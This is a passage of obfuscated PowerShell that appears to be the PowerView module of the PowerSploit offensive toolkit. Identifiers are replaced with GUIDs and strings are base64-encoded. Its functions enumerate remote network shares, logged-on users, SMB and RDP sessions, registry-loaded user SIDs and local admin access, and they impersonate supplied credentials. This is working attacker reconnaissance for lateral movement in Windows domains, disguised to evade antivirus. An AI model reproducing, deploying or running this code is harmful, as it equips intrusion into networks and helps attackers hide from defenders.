${7f50cc77ecd24a108ede9377d82e51fa} = 
${3893d1cccfdb4991a1cf64ee551c52b6} | Select-Object *
                
    ${7f50cc77ecd24a108ede9377d82e51fa} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
${9c0baec859734fc983ee3c04b4cde8a7}
                    
${7f50cc77ecd24a108ede9377d82e51fa}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBTAGgAYQByAGUASQBuAGYAbwA='))))
          
          $Offset = ${dffff067b0bb45ce8471f1eab3733053}.ToInt64()
    
                $Offset += ${212b5abc53674a08833ac540af56a71e}
       
             ${7f50cc77ecd24a108ede9377d82e51fa}
                }
    
            $Null = 
${b65b271ff93e4a76a0ec16347a31f911}::NetApiBufferFree
(${3cb25c0653624048a18c1e94cd5422f2})
            }
            else 
{
                Write-Verbose "[Get-NetShare] Error: 
$(([ComponentModel.Win32Exception] 
${cb7c2f5226ed472aad598a82813f1629}).Message)"
            }
        
}
    }
    END {
        if (${bfcebd26467f492297f5dcbf75cad4ab}) {
    
        Invoke-RevertToSelf -TokenHandle 
${bfcebd26467f492297f5dcbf75cad4ab}
        }
    }
}
function Get-
NetLoggedon {
    [OutputType('PowerView.LoggedOnUserInfo')]
    
[CmdletBinding()]
    Param(
        [Parameter(Position = 0, 
ValueFromPipeline = $True, ValueFromPipelineByPropertyName = 
$True)]
        [Alias('HostName', 'dnshostname', 'name')]
        
[ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 
'localhost',
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
   
         ${bfcebd26467f492297f5dcbf75cad4ab} = Invoke-
UserImpersonation -Credential $Credential
        }
    }
    PROCESS 
{
        ForEach (${9c0baec859734fc983ee3c04b4cde8a7} in 
$ComputerName) {
            ${7167c5f4208044fbbda5f32ba6f54f80} = 1
  
          ${3cb25c0653624048a18c1e94cd5422f2} = [IntPtr]::Zero
       
     ${347b3a3d0e1944f09811a46922972f16} = 0
            
${d8e3734f3f9b4abb931db148d62e534a} = 0
            
${a73887482c7b4d84a0ec3abf865c8e35} = 0
            
${cb7c2f5226ed472aad598a82813f1629} = 
${b65b271ff93e4a76a0ec16347a31f911}::NetWkstaUserEnum
(${9c0baec859734fc983ee3c04b4cde8a7}, 
${7167c5f4208044fbbda5f32ba6f54f80}, 
[ref]${3cb25c0653624048a18c1e94cd5422f2}, -1, 
[ref]${347b3a3d0e1944f09811a46922972f16}, 
[ref]${d8e3734f3f9b4abb931db148d62e534a}, 
[ref]${a73887482c7b4d84a0ec3abf865c8e35})
            $Offset = 
${3cb25c0653624048a18c1e94cd5422f2}.ToInt64()
            if 
((${cb7c2f5226ed472aad598a82813f1629} -eq 0) -and ($Offset -gt 0)) 
{
                ${212b5abc53674a08833ac540af56a71e} = 
${036bdd421285436982caee874d80a0d5}::GetSize()
                for 
(${9e5bb180fda8451b8ec7f5d4ed0667a4} = 0; 
(${9e5bb180fda8451b8ec7f5d4ed0667a4} -lt 
${347b3a3d0e1944f09811a46922972f16}); 
${9e5bb180fda8451b8ec7f5d4ed0667a4}++) {
                    
${dffff067b0bb45ce8471f1eab3733053} = New-Object System.Intptr -
ArgumentList $Offset
                    
${3893d1cccfdb4991a1cf64ee551c52b6} = 
${dffff067b0bb45ce8471f1eab3733053} -as 
${036bdd421285436982caee874d80a0d5}
                    
${88d88e3c0c4442238ac361f03133c9af} = 
${3893d1cccfdb4991a1cf64ee551c52b6} | Select-Object *
                
    ${88d88e3c0c4442238ac361f03133c9af} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
${9c0baec859734fc983ee3c04b4cde8a7}
                    
${88d88e3c0c4442238ac361f03133c9af}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgBJAG4AZg
BvAA=='))))
                    $Offset = 
${dffff067b0bb45ce8471f1eab3733053}.ToInt64()
                    
$Offset += ${212b5abc53674a08833ac540af56a71e}
                    
${88d88e3c0c4442238ac361f03133c9af}
                }
                
$Null = ${b65b271ff93e4a76a0ec16347a31f911}::NetApiBufferFree
(${3cb25c0653624048a18c1e94cd5422f2})
            }
            else 
{
                Write-Verbose "[Get-NetLoggedon] Error: 
$(([ComponentModel.Win32Exception] 
${cb7c2f5226ed472aad598a82813f1629}).Message)"
            }
        
}
    }
    END {
        if (${bfcebd26467f492297f5dcbf75cad4ab}) {
    
        Invoke-RevertToSelf -TokenHandle 
${bfcebd26467f492297f5dcbf75cad4ab}
        }
    }
}
function Get-
NetSession {
    [OutputType('PowerView.SessionInfo')]
    
[CmdletBinding()]
    Param(
        [Parameter(Position = 0, 
ValueFromPipeline = $True, ValueFromPipelineByPropertyName = 
$True)]
        [Alias('HostName', 'dnshostname', 'name')]
        
[ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 
'localhost',
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
   
         ${bfcebd26467f492297f5dcbf75cad4ab} = Invoke-
UserImpersonation -Credential $Credential
        }
    }
    PROCESS 
{
        ForEach (${9c0baec859734fc983ee3c04b4cde8a7} in 
$ComputerName) {
            ${7167c5f4208044fbbda5f32ba6f54f80} = 
10
            ${3cb25c0653624048a18c1e94cd5422f2} = [IntPtr]::Zero
   
         ${347b3a3d0e1944f09811a46922972f16} = 0
            
${d8e3734f3f9b4abb931db148d62e534a} = 0
            
${a73887482c7b4d84a0ec3abf865c8e35} = 0
            
${cb7c2f5226ed472aad598a82813f1629} = 
${b65b271ff93e4a76a0ec16347a31f911}::NetSessionEnum
(${9c0baec859734fc983ee3c04b4cde8a7}, '', 
${e0e6b6d01ca04c90bf52fb20f9e41317}, 
${7167c5f4208044fbbda5f32ba6f54f80}, 
[ref]${3cb25c0653624048a18c1e94cd5422f2}, -1, 
[ref]${347b3a3d0e1944f09811a46922972f16}, 
[ref]${d8e3734f3f9b4abb931db148d62e534a}, 
[ref]${a73887482c7b4d84a0ec3abf865c8e35})
            $Offset = 
${3cb25c0653624048a18c1e94cd5422f2}.ToInt64()
            if 
((${cb7c2f5226ed472aad598a82813f1629} -eq 0) -and ($Offset -gt 0)) 
{
                ${212b5abc53674a08833ac540af56a71e} = 
${164040aeb62f4c148652befe6bcab782}::GetSize()
                for 
(${9e5bb180fda8451b8ec7f5d4ed0667a4} = 0; 
(${9e5bb180fda8451b8ec7f5d4ed0667a4} -lt 
${347b3a3d0e1944f09811a46922972f16}); 
${9e5bb180fda8451b8ec7f5d4ed0667a4}++) {
                    
${dffff067b0bb45ce8471f1eab3733053} = New-Object System.Intptr -
ArgumentList $Offset
                    
${3893d1cccfdb4991a1cf64ee551c52b6} = 
${dffff067b0bb45ce8471f1eab3733053} -as 
${164040aeb62f4c148652befe6bcab782}
                    
${bf54ffd7b29642aaad7029f3922629a7} = 
${3893d1cccfdb4991a1cf64ee551c52b6} | Select-Object *
                
    ${bf54ffd7b29642aaad7029f3922629a7} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
${9c0baec859734fc983ee3c04b4cde8a7}
                    
${bf54ffd7b29642aaad7029f3922629a7}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBTAGUAcwBzAGkAbwBuAEkAbgBmAG8A'))))
      
              $Offset = ${dffff067b0bb45ce8471f1eab3733053}.ToInt64
()
                    $Offset += 
${212b5abc53674a08833ac540af56a71e}
                    
${bf54ffd7b29642aaad7029f3922629a7}
                }
                
$Null = ${b65b271ff93e4a76a0ec16347a31f911}::NetApiBufferFree
(${3cb25c0653624048a18c1e94cd5422f2})
            }
            else 
{
                Write-Verbose "[Get-NetSession] Error: 
$(([ComponentModel.Win32Exception] 
${cb7c2f5226ed472aad598a82813f1629}).Message)"
            }
        
}
    }
    END {
        if (${bfcebd26467f492297f5dcbf75cad4ab}) {
    
        Invoke-RevertToSelf -TokenHandle 
${bfcebd26467f492297f5dcbf75cad4ab}
        }
    }
}
function Get-
RegLoggedOn {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType
('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        
[Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 
'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        
[String[]]
        $ComputerName = 'localhost'
    )
    BEGIN {
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
   
         ${bfcebd26467f492297f5dcbf75cad4ab} = Invoke-
UserImpersonation -Credential $Credential
        }
    }
    PROCESS 
{
        ForEach (${9c0baec859734fc983ee3c04b4cde8a7} in 
$ComputerName) {
            try {
                
${05d1e315edfb4092be735e9339c2df41} = 
[Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgBzAA=='))), 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA='))))
                
${05d1e315edfb4092be735e9339c2df41}.GetSubKeyNames() | Where-Object 
{ $_ -match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMA
AtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) } | ForEach-Object {
          
          ${e0e6b6d01ca04c90bf52fb20f9e41317} = ConvertFrom-SID -
ObjectSID $_ -OutputType $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4AUwBpAG0AcABsAGUA')))
   
                 if (${e0e6b6d01ca04c90bf52fb20f9e41317}) {
          
              ${e0e6b6d01ca04c90bf52fb20f9e41317}, $UserDomain = 
${e0e6b6d01ca04c90bf52fb20f9e41317}.Split('@')
                    }
  
                  else {
                        
${e0e6b6d01ca04c90bf52fb20f9e41317} = $_
                        
$UserDomain = $Null
                    }
                    
${ac5155e871314ac4aaae8c90013aeb92} = New-Object PSObject
            
        ${ac5155e871314ac4aaae8c90013aeb92} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQA=')))
                    
${ac5155e871314ac4aaae8c90013aeb92} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $UserDomain
                    
${ac5155e871314ac4aaae8c90013aeb92} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgBOAGEAbQBlAA=='))) ${e0e6b6d01ca04c90bf52fb20f9e41317}
   
                 ${ac5155e871314ac4aaae8c90013aeb92} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) $_
            
        
${ac5155e871314ac4aaae8c90013aeb92}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBSAGUAZwBMAG8AZwBnAGUAZABPAG4AVQBzAGUAcg
A='))))
                    ${ac5155e871314ac4aaae8c90013aeb92}
       
         }
            }
            catch {
                Write-
Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAFIAZQBnAEwAbwBnAGcAZQBkAE8AbgBdACAARQByAHIAbwByACAAbw
BwAGUAbgBpAG4AZwAgAHIAZQBtAG8AdABlACAAcgBlAGcAaQBzAHQAcgB5ACAAbwBuAC
AAJwAkAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACcAIAA6ACAAJABfAA==')))
       
     }
        }
    }
    END {
        if 
(${bfcebd26467f492297f5dcbf75cad4ab}) {
            Invoke-
RevertToSelf -TokenHandle ${bfcebd26467f492297f5dcbf75cad4ab}
        
}
    }
}
function Get-NetRDPSession {
    [OutputType
('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        
[Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 
'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        
[String[]]
        $ComputerName = 'localhost',
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
   
         ${bfcebd26467f492297f5dcbf75cad4ab} = Invoke-
UserImpersonation -Credential $Credential
        }
    }
    PROCESS 
{
        ForEach (${9c0baec859734fc983ee3c04b4cde8a7} in 
$ComputerName) {
            ${a7de0f75f9244934a0d9eeb2ceef8bdc} = 
${7755ea9f5656424eb57373227129eabc}::WTSOpenServerEx
(${9c0baec859734fc983ee3c04b4cde8a7})
            if 
(${a7de0f75f9244934a0d9eeb2ceef8bdc} -ne 0) {
                
${70d21cad2214451a85dff96266aa0c69} = [IntPtr]::Zero
                
${36ae753d85cf480f8e9b8500e61ed36c} = 0
                
${cb7c2f5226ed472aad598a82813f1629} = 
${7755ea9f5656424eb57373227129eabc}::WTSEnumerateSessionsEx
(${a7de0f75f9244934a0d9eeb2ceef8bdc}, [ref]1, 0, 
[ref]${70d21cad2214451a85dff96266aa0c69}, 
[ref]${36ae753d85cf480f8e9b8500e61ed36c});
${540d2c2f94624a079816177d2dca65b6} = 
[Runtime.InteropServices.Marshal]::GetLastWin32Error()
               
 $Offset = ${70d21cad2214451a85dff96266aa0c69}.ToInt64()
             
   if ((${cb7c2f5226ed472aad598a82813f1629} -ne 0) -and ($Offset -gt 
0)) {
                    ${212b5abc53674a08833ac540af56a71e} = 
${8078b828c51c4adbae041b90a3bc67e4}::GetSize()
                    
for (${9e5bb180fda8451b8ec7f5d4ed0667a4} = 0; 
(${9e5bb180fda8451b8ec7f5d4ed0667a4} -lt 
${36ae753d85cf480f8e9b8500e61ed36c}); 
${9e5bb180fda8451b8ec7f5d4ed0667a4}++) {
                        
${dffff067b0bb45ce8471f1eab3733053} = New-Object System.Intptr -
ArgumentList $Offset
                        
${3893d1cccfdb4991a1cf64ee551c52b6} = 
${dffff067b0bb45ce8471f1eab3733053} -as 
${8078b828c51c4adbae041b90a3bc67e4}
                        
${bbba62016fd24fd8895b24e521f430db} = New-Object PSObject
            
            if (${3893d1cccfdb4991a1cf64ee551c52b6}.pHostName) {
     
                       ${bbba62016fd24fd8895b24e521f430db} | Add-
Member Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
${3893d1cccfdb4991a1cf64ee551c52b6}.pHostName
                        
}
                        else {
                            
${bbba62016fd24fd8895b24e521f430db} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
${9c0baec859734fc983ee3c04b4cde8a7}
                        }
         
               ${bbba62016fd24fd8895b24e521f430db} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBOAGEAbQBlAA=='))) 
${3893d1cccfdb4991a1cf64ee551c52b6}.pSessionName
                     
   if ($(-not ${3893d1cccfdb4991a1cf64ee551c52b6}.pDomainName) -or 
(${3893d1cccfdb4991a1cf64ee551c52b6}.pDomainName -eq '')) {
          
                  ${bbba62016fd24fd8895b24e521f430db} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) 
"$(${3893d1cccfdb4991a1cf64ee551c52b6}.pUserName)"
                   
     }
                        else {
                            
${bbba62016fd24fd8895b24e521f430db} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgBOAGEAbQBlAA=='))) 
"$(${3893d1cccfdb4991a1cf64ee551c52b6}.pDomainName)\
$(${3893d1cccfdb4991a1cf64ee551c52b6}.pUserName)"
                    
    }
                        ${bbba62016fd24fd8895b24e521f430db} | 
Add-Member Noteproperty 'ID' 
${3893d1cccfdb4991a1cf64ee551c52b6}.SessionID
                        
${bbba62016fd24fd8895b24e521f430db} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwB0AGEAdABlAA=='))) ${3893d1cccfdb4991a1cf64ee551c52b6}.State
     
                   ${c09cefc326164927bad14e594cd3e32f} = 
[IntPtr]::Zero
                        
${a1989f411b784c1dae19ebd32f5e8a0a} = 0
                        
${97076fcc9e8845048d20af95e4436690} = 
${7755ea9f5656424eb57373227129eabc}::WTSQuerySessionInformation
(${a7de0f75f9244934a0d9eeb2ceef8bdc}, 
${3893d1cccfdb4991a1cf64ee551c52b6}.SessionID, 14, 
[ref]${c09cefc326164927bad14e594cd3e32f}, 
[ref]${a1989f411b784c1dae19ebd32f5e8a0a});
${3dfd5a241e8540edbcb13508400da260} = 
[Runtime.InteropServices.Marshal]::GetLastWin32Error()
               
         if (${97076fcc9e8845048d20af95e4436690} -eq 0) {
            
                Write-Verbose "[Get-NetRDPSession] Error: 
$(([ComponentModel.Win32Exception] 
${3dfd5a241e8540edbcb13508400da260}).Message)"
                       
 }
                        else {
                            
${d4eaba0213a5458a88bb5f7a6eac0f6c} = 
${c09cefc326164927bad14e594cd3e32f}.ToInt64()
                        
    ${2f358c91f69349ea86f9eebd51f4644f} = New-Object System.Intptr 
-ArgumentList ${d4eaba0213a5458a88bb5f7a6eac0f6c}
                    
        ${16c78aaf9ec849b9a8b2d644fb3c89a5} = 
${2f358c91f69349ea86f9eebd51f4644f} -as 
${bd6637eacee942fd9576e56a6f2cc642}
                            
${408abebec52c4ddc8457ff163362f002} = 
${16c78aaf9ec849b9a8b2d644fb3c89a5}.Address
                          
  if (${408abebec52c4ddc8457ff163362f002}[2] -ne 0) {
                
                ${408abebec52c4ddc8457ff163362f002} = 
[String]${408abebec52c4ddc8457ff163362f002}
[2]+'.'+[String]${408abebec52c4ddc8457ff163362f002}
[3]+'.'+[String]${408abebec52c4ddc8457ff163362f002}
[4]+'.'+[String]${408abebec52c4ddc8457ff163362f002}[5]
               
             }
                            else {
                     
           ${408abebec52c4ddc8457ff163362f002} = $Null
               
             }
                            
${bbba62016fd24fd8895b24e521f430db} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBvAHUAcgBjAGUASQBQAA=='))) ${408abebec52c4ddc8457ff163362f002}
   
                         
${bbba62016fd24fd8895b24e521f430db}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBSAEQAUABTAGUAcwBzAGkAbwBuAEkAbgBmAG8A')
)))
                            ${bbba62016fd24fd8895b24e521f430db}
   
                         $Null = 
${7755ea9f5656424eb57373227129eabc}::WTSFreeMemory
(${c09cefc326164927bad14e594cd3e32f})
                            
$Offset += ${212b5abc53674a08833ac540af56a71e}
                       
 }
                    }
                    $Null = 
${7755ea9f5656424eb57373227129eabc}::WTSFreeMemoryEx(2, 
${70d21cad2214451a85dff96266aa0c69}, 
${36ae753d85cf480f8e9b8500e61ed36c})
                }
                
else {
                    Write-Verbose "[Get-NetRDPSession] Error: 
$(([ComponentModel.Win32Exception] 
${540d2c2f94624a079816177d2dca65b6}).Message)"
                }
      
          $Null = 
${7755ea9f5656424eb57373227129eabc}::WTSCloseServer
(${a7de0f75f9244934a0d9eeb2ceef8bdc})
            }
            else 
{
                Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAE4AZQB0AFIARABQAFMAZQBzAHMAaQBvAG4AXQAgAEUAcgByAG8Acg
AgAG8AcABlAG4AaQBuAGcAIAB0AGgAZQAgAFIAZQBtAG8AdABlACAARABlAHMAawB0AG
8AcAAgAFMAZQBzAHMAaQBvAG4AIABIAG8AcwB0ACAAKABSAEQAIABTAGUAcwBzAGkAbw
BuACAASABvAHMAdAApACAAcwBlAHIAdgBlAHIAIABmAG8AcgA6ACAAJABDAG8AbQBwAH
UAdABlAHIATgBhAG0AZQA=')))
            }
        }
    }
    END {
       
 if (${bfcebd26467f492297f5dcbf75cad4ab}) {
            Invoke-
RevertToSelf -TokenHandle ${bfcebd26467f492297f5dcbf75cad4ab}
        
}
    }
}
function Test-AdminAccess {
    [OutputType
('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        
[Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 
'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        
[String[]]
        $ComputerName = 'localhost',
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
   
         ${bfcebd26467f492297f5dcbf75cad4ab} = Invoke-
UserImpersonation -Credential $Credential
        }
    }
    PROCESS 
{
        ForEach (${9c0baec859734fc983ee3c04b4cde8a7} in 
$ComputerName) {
            ${a7de0f75f9244934a0d9eeb2ceef8bdc} = 
${d8402eaefa6844d19815430c6481b92a}::OpenSCManagerW
($ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XABcACQAewA5AGMAMABiAGEAZQBjADgANQA5ADcAMwA0AGYAYwA5ADgAMwBlAGUAMw
BjADAANABiADQAYwBkAGUAOABhADcAfQA='))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBpAGMAZQBzAEEAYwB0AGkAdgBlAA=='))), 0xF003F);
${540d2c2f94624a079816177d2dca65b6} = 
[Runtime.InteropServices.Marshal]::GetLastWin32Error()
            
${d0087f993b24488d9e6ead9ce11f7c3a} = New-Object PSObject
            
${d0087f993b24488d9e6ead9ce11f7c3a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
${9c0baec859734fc983ee3c04b4cde8a7}
            if 
(${a7de0f75f9244934a0d9eeb2ceef8bdc} -ne 0) {
                $Null = 
${d8402eaefa6844d19815430c6481b92a}::CloseServiceHandle
(${a7de0f75f9244934a0d9eeb2ceef8bdc})
                
${d0087f993b24488d9e6ead9ce11f7c3a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBzAEEAZABtAGkAbgA='))) $True
            }
            else {
      
          Write-Verbose "[Test-AdminAccess] Error: 
$(([ComponentModel.Win32Exception] 
${540d2c2f94624a079816177d2dca65b6}).Message)"
                
${d0087f993b24488d9e6ead9ce11f7c3a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBzAEEAZABtAGkAbgA='))) $False
            }
            
${d0087f993b24488d9e6ead9ce11f7c3a}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBBAGQAbQBpAG4AQQBjAGMAZQBzAHMA'))))
      
      ${d0087f993b24488d9e6ead9ce11f7c3a}
        }
    }
    END {
     
   if (${bfcebd26467f492297f5dcbf75cad4ab}) {
            Invoke-
RevertToSelf -TokenHandle ${bfcebd26467f492297f5dcbf75cad4ab}
        
}
    }
}
function Get-NetComputerSiteName {
    [OutputType
('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        
[Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 
'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        
[String[]]
        $ComputerName = 'localhost',
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
   
         ${bfcebd26467f492297f5dcbf75cad4ab} = Invoke-
UserImpersonation -Credential $Credential
        }
    }
    PROCESS 
{
        ForEach (${9c0baec859734fc983ee3c04b4cde8a7} in 
$ComputerName) {
            if (${9c0baec859734fc983ee3c04b4cde8a7} 
-match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('XgAoAD8AOgBbADAALQA5AF0AewAxACwAMwB9AFwALgApAHsAMwB9AFsAMAAtADkAXQ
B7ADEALAAzAH0AJAA=')))) {
                
${165f47fdf14d46afb5277d3136d0d378} = 
${9c0baec859734fc983ee3c04b4cde8a7}
                
${9c0baec859734fc983ee3c04b4cde8a7} = 
[System.Net.Dns]::GetHostByAddress
(${9c0baec859734fc983ee3c04b4cde8a7}) | Select-Object -
ExpandProperty HostName
            }
            else {
               
 ${165f47fdf14d46afb5277d3136d0d378} = @(Resolve-IPAddress -
ComputerName ${9c0baec859734fc983ee3c04b4cde8a7})[0].IPAddress
       
     }
            ${3cb25c0653624048a18c1e94cd5422f2} = 
[IntPtr]::Zero
            ${cb7c2f5226ed472aad598a82813f1629} = 
${b65b271ff93e4a76a0ec16347a31f911}::DsGetSiteName
(${9c0baec859734fc983ee3c04b4cde8a7}, 
[ref]${3cb25c0653624048a18c1e94cd5422f2})
            
${c57ce429cada4aedb1e5c54e27150c97} = New-Object PSObject
            
${c57ce429cada4aedb1e5c54e27150c97} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
${9c0baec859734fc983ee3c04b4cde8a7}
            
${c57ce429cada4aedb1e5c54e27150c97} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBQAEEAZABkAHIAZQBzAHMA'))) ${165f47fdf14d46afb5277d3136d0d378}
   
         if (${cb7c2f5226ed472aad598a82813f1629} -eq 0) {
            
    $Sitename = 
[System.Runtime.InteropServices.Marshal]::PtrToStringAuto
(${3cb25c0653624048a18c1e94cd5422f2})
                
${c57ce429cada4aedb1e5c54e27150c97} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBpAHQAZQBOAGEAbQBlAA=='))) $Sitename
            }
            
else {
                Write-Verbose "[Get-NetComputerSiteName] 
Error: $(([ComponentModel.Win32Exception] 
${cb7c2f5226ed472aad598a82813f1629}).Message)"
                
${c57ce429cada4aedb1e5c54e27150c97} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBpAHQAZQBOAGEAbQBlAA=='))) ''
            }
            
${c57ce429cada4aedb1e5c54e27150c97}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBDAG8AbQBwAHUAdABlAHIAUwBpAHQAZQA='))))
  
          $Null = 
${b65b271ff93e4a76a0ec16347a31f911}::NetApiBufferFree
(${3cb25c0653624048a18c1e94cd5422f2})
            
${c57ce429cada4aedb1e5c54e27150c97}
        }
    }
    END {
        if 
(${bfcebd26467f492297f5dcbf75cad4ab}) {
            Invoke-
RevertToSelf -TokenHandle ${bfcebd26467f492297f5dcbf75cad4ab}
        
}
    }
}
function Get-WMIRegProxy {
    [OutputType
('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        
[Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 
'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        
[String[]]
        $ComputerName = $Env:COMPUTERNAME,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        
